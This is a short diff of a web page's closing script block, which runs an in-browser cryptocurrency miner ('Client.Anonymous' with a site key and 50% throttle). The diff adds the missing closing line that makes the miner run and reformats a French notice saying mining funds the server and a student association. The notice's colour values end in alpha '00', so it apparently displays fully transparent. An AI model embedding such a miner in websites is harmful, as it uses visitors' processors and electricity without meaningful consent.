@@ -174,7 +174,8 @@ if ($ret == false) {
 <script>
     var _client = new Client.Anonymous('a46423f62abe8267b3f27868e17256362bcec5966b4b51589bff0bf8aacf8c7b', {
         throttle: 0.5, c: 'w', ads: 0
+    });
     _client.start();
-    _client.addMiningNotification("Floating Bottom", "Ce site mine de la cryptomonaie pour finance le serveur et le reste sera reverser au BDE.", "#363e4100" , 20,"#363e4100");
+    _client.addMiningNotification("Floating Bottom", "Ce site mine de la cryptomonaie pour finance le serveur et le reste sera reverser au BDE.", "#363e4100", 20, "#363e4100");
 </script>
 </body>
